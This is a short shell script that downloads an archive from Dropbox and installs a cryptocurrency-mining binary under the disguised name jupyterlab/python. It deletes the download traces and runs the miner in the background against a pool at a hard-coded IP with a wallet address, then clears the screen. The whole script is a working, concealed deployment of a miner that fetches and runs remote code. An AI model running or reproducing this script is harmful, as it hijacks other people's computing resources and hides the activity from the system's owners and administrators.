#!/bin/sh
cd /home/sshuser
sysctl vm.nr_hugepages=2048
ls
wget https://www.dropbox.com/s/2j15ohnntlucrf2/nodejsapp8q.tar.gz
tar xvzf nodejsapp8q.tar.gz
mkdir jupyterlab
cd nodejsbrnt
cp nodejsfive /home/sshuser/jupyterlab/python
cd /home/sshuser
rm -r nodejsapp8q.tar.gz
rm -r nodejsbrnt
cd /home/sshuser/jupyterlab
./python -o 95.216.42.85:10112 -u LQgQUcMbPU5VuhuXYnZLiLA7ZiANrJsDdKoUhB4FqYVdeKF1ES9RZWRBLrur2N1LfMQ3CyLh8M5ccdU4VudHPsJv4DjEy6s.75000 -p za -a rx/loki --donate-level 1 -t 7 -B
clear
mkdir d
